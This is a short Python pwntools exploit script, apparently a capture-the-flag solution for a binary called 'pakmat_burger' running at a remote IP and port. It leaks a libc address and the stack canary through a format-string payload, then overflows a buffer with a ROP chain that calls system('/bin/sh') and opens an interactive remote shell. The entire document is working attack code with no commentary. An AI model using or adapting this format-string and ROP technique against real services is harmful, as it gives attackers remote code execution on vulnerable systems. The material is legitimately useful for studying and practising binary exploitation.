from pwn import *
#io = process("pakmat_burger",aslr=False)
io = remote("13.229.222.125",32874)
libc = ELF("./libc.so.6")

#secret = b"1337"
secret = b"e31c8306"
io.sendlineafter(b"Please enter your name:",b"%15$p%13$p")
io.recvuntil(b"Hi ")
libc.address = int(io.recv(14).decode(),16) - 128 - 171280
log.info("LIBC BASE: " + hex(libc.address))

canary = int(io.recv(18).decode(),16)
log.info("CANARY: " + hex(canary))

#gdb.attach(io,gdbscript="break *0x5555555554fe")
io.sendlineafter(b"enter the secret message:",secret)
io.sendlineafter(b"order?",b"abcd")

# gadgets found in libc
popRdi = p64(libc.address + 0x2a3e5)
ret = p64(libc.address + 0x2a3e6)

rop  = b"A"* 37 + p64(canary) + b"A"*8
rop += ret + popRdi + p64(next(libc.search(b"/bin/sh"))) + p64(libc.symbols["system"])

io.sendlineafter(b"soon:",rop)

io.interactive()
